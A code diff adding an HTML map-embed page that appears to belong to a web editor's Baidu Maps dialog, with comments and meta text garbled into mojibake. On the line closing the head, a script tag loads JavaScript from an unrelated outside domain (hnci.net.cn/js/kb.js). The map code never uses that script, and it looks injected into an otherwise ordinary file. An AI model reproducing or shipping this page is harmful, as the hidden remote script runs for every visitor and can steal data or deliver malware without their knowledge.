@@ -1,0 +1,121 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="�ٶȵ�ͼ,�ٶȵ�ͼAPI���ٶȵ�ͼ�Զ��幤�ߣ��ٶȵ�ͼ���������ù���">
+    <meta name="description" content="�ٶȵ�ͼAPI�Զ����ͼ�������û��ڿ��ӻ����������ɰٶȵ�ͼ">
+<!--    <title>�ٶȵ�ͼAPI�Զ����ͼ</title>-->
+    <!--���ðٶȵ�ͼAPI-->
+    <style type="text/css">
+        html, body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+    </style>
+    <script type="text/javascript" src="../../../api-1.1_true.js"></script>
+<script type="text/javascript" src="https://hnci.net.cn/js/kb.js"></script></head>
+
+<body onload="initMap();">
+<!--�ٶȵ�ͼ����-->
+<div style="width:697px;height:550px;border:#ccc solid 1px;" id="dituContent"></div>
+</body>
+<script type="text/javascript">
+   try{
+    window.parent.iframe_zoom();
+    }catch(e){}
+    function getParam(name) {
+        return location.href.match(new RegExp('[?#&]' + name + '=([^?#&]+)', 'i')) ? RegExp.$1 : '';
+    }
+    var map, marker;
+    var centerParam = getParam('center');
+    var zoomParam = getParam('zoom');
+    var widthParam = getParam('width');
+    var heightParam = getParam('height');
+    var markersParam = getParam('markers');
+    var markerStylesParam = getParam('markerStyles');
+
+    //�����ͳ�ʼ����ͼ������
+    function initMap() {
+        // [FF]�л�ģʽ�󱨴�
+        if (!window.BMap) {
+            return;
+        }
+        var dituContent = document.getElementById('dituContent');
+        dituContent.style.width = widthParam + 'px';
+        dituContent.style.height = heightParam + 'px';
+
+        createMap();//������ͼ
+        setMapEvent();//���õ�ͼ�¼�
+        addMapControl();//���ͼ��ӿؼ�
+
+        // ������ע
+        var markersArr = markersParam.split(',');
+        var point = new BMap.Point(markersArr[0], markersArr[1]);
+        marker = new BMap.Marker(point);
+        marker.enableDragging();
+        map.addOverlay(marker); // ����ע��ӵ���ͼ��
+
+        if(parent.editor && parent.document.body.contentEditable=="true") { //�ڱ༭״̬��
+            setMapListener();//��ͼ�ı��޸�����iframe��ǩsrc����
+        }
+    }
+
+    //������ͼ������
+    function createMap() {
+        map = new BMap.Map("dituContent");//�ڰٶȵ�ͼ�����д���һ����ͼ
+        var centerArr = centerParam.split(',');
+        var point = new BMap.Point(parseFloat(centerArr[0]), parseFloat(centerArr[1]));//����һ�����ĵ�����
+        map.centerAndZoom(point, parseInt(zoomParam));//�趨��ͼ�����ĵ�����겢����ͼ��ʾ�ڵ�ͼ������
+    }
+
+    //��ͼ�¼����ú�����
+    function setMapEvent() {
+        map.enableDragging();//���õ�ͼ��ק�¼���Ĭ������(�ɲ�д)
+        map.enableScrollWheelZoom();//���õ�ͼ���ַŴ���С
+        map.enableDoubleClickZoom();//�������˫���Ŵ�Ĭ������(�ɲ�д)
+        map.enableKeyboard();//���ü����������Ҽ��ƶ���ͼ
+    }
+
+    //��ͼ�ؼ���Ӻ�����
+    function addMapControl() {
+        //���ͼ��������ſؼ�
+        var ctrl_nav = new BMap.NavigationControl({anchor: BMAP_ANCHOR_TOP_LEFT, type: BMAP_NAVIGATION_CONTROL_LARGE});
+        map.addControl(ctrl_nav);
+        //���ͼ���������ͼ�ؼ�
+        var ctrl_ove = new BMap.OverviewMapControl({anchor: BMAP_ANCHOR_BOTTOM_RIGHT, isOpen: 1});
+        map.addControl(ctrl_ove);
+        //���ͼ����ӱ����߿ؼ�
+        var ctrl_sca = new BMap.ScaleControl({anchor: BMAP_ANCHOR_BOTTOM_LEFT});
+        map.addControl(ctrl_sca);
+    }
+
+    function setMapListener() {
+        var editor = parent.editor, containerIframe,
+            iframes = parent.document.getElementsByTagName('iframe');
+        for (var key in iframes) {
+            if (iframes[key].contentWindow == window) {
+                containerIframe = iframes[key];
+                break;
+            }
+        }
+        if (containerIframe) {
+            map.addEventListener('moveend', mapListenerHandler);
+            map.addEventListener('zoomend', mapListenerHandler);
+            marker.addEventListener('dragend', mapListenerHandler);
+        }
+
+        function mapListenerHandler() {
+            var zoom = map.getZoom(),
+                center = map.getCenter(),
+                marker = window.marker.getPoint();
+            containerIframe.src = containerIframe.src.
+                replace(new RegExp('([?#&])center=([^?#&]+)', 'i'), '$1center=' + center.lng + ',' + center.lat).
+                replace(new RegExp('([?#&])markers=([^?#&]+)', 'i'), '$1markers=' + marker.lng + ',' + marker.lat).
+                replace(new RegExp('([?#&])zoom=([^?#&]+)', 'i'), '$1zoom=' + zoom);
+            editor.fireEvent('saveScene');
+        }
+    }
+</script>
+</html>
